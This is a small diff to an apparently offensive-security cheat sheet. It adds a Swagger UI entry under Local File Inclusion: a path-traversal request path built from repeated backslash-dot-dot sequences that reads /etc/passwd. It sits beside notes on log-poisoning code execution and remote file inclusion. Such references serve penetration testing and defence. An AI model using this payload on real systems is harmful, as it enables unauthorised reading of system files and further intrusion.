@@ -44,6 +44,10 @@ Local File Inclusion
 
 			reload log file to execute code
 
+		Swagger UI
+
+			/v1/docs//..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\..\\\/etc/passwd HTTP/1.1
+
 Remote File Inclusion
 
 	if allow_url_fopen and allow_url_include are enabled in the /etc/php5/cgi/php.ini
